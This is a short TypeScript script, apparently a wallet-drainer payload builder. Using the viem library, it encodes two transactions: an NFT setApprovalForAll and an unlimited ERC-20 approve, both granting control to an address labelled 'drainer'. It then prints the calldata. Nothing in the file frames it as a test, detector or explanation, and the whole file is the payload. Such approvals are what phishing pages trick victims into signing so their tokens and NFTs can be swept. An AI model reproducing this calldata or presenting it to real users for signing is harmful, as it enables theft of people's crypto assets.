import { encodeFunctionData, parseAbi, maxUint256 } from "viem";

const drainer = "0x0000000000000000000000000000000000badbad";

const setApprovalForAll = encodeFunctionData({
  abi: parseAbi(["function setApprovalForAll(address operator, bool approved)"]),
  functionName: "setApprovalForAll",
  args: [drainer, true],
});

const approveUnlimited = encodeFunctionData({
  abi: parseAbi(["function approve(address spender, uint256 amount)"]),
  functionName: "approve",
  args: [drainer, maxUint256],
});

console.log(JSON.stringify({ setApprovalForAll, approveUnlimited }, null, 2));
